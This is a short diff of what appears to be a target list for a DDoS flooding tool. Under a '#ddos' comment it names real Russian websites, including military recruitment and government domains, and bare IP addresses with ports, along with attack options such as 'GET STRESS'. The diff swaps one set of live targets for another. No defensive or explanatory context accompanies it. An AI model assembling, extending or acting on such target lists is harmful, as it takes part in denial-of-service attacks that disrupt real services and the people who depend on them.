@@ -22,7 +22,7 @@ tcp://213.59.254.8:433 tcp://213.59.253.7:80 tcp://213.59.253.7:443
 
 
 #ddos separiv
-http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 --http-methods GET STRESS
-http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 --http-methods GET STRESS
-tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 
+https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
+
+
 
